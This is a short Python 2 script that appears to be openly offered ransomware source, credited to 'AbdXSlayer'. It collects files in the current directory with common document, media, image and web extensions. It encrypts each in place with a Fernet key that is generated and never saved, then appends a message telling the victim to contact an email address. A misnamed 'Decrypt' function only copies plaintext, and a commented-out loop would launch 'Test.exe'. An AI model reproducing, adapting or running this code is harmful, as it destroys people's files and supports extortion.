import os,sys,time,glob
from cryptography.fernet import Fernet

#By AbdXSlayer http://www.github.com/ABDXH4K3r
def FoundF():
    path = os.getcwd()
    files = os.listdir(path)
    ext = ('.txt','.aif','.wav','.mpa','.wav','.mp3','.mid','.cda','.doc','.wmv','.wma','.xml','.pptx','.doc','.docx','.odt','.pdf','.rtf','.tex','.wks','.wpd','.dll','.bin','.cab','reg','.png','.jpg','.aex','.jpeg','.html','.php')
    files_txt = [i for i in files if i.endswith(ext)]
    res = '\n'.join(files_txt)
    print files_txt
    return files_txt

file_name = FoundF()

def X():
    x = raw_input('\nEnter To Exit...')

def Decrypt():
    prg = file_name
    for x in prg:
        file = open(x,'r')
        data = file.read()
        file_secret = open(x+' [Recovery].abdx','w')
        file_secret.write(data)
        file_secret.close()

def Crypt():
    key = Fernet.generate_key()
    prg = file_name
    for x in prg:
        file = open(x,'r')
        data = file.read()
        cipher_suite = Fernet(key)
        encrypted = cipher_suite.encrypt(data)
        fileclean = open(x, 'w').close()
        filew = open(x, 'w')
        filew.write(encrypted+'\n\n'+'Your Documents Has Been Encrypted by AbdXSlayer Contact As8apple@gmail.com For Help :).')
        filew.close()

def BackgroundUse():
    path = os.getcwd()
    exe = 'Test.exe'
    script = path+"\\"+exe
    os.system(script)

Decrypt()
Crypt()

#if __name__=='__main__':
#    while True:
#        BackgroundUse()
